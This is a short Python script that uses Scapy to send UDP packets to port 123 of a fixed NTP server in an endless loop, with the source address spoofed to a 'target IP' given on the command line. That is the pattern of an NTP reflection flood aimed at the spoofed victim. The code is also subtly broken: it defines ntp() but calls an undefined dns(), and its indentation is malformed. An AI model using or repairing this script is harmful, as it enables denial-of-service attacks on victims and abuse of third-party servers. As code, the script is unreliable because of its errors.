import sys
from scapy.all import *

def ntp(s_ip,s_port):
    packet=IP(src=s_ip,dst="141.0.239.1")/UDP(sport=s_port,dport=123)
    send(packet,loop=True)

if __name__ == "__main__":
   if len(sys.argv) < 3:
	    print("Usage: {} <target IP><port>".format(sys.argv[0]))
	    sys.exit(1)
	  
dns(sys.argv[1],int(sys.argv[2]))
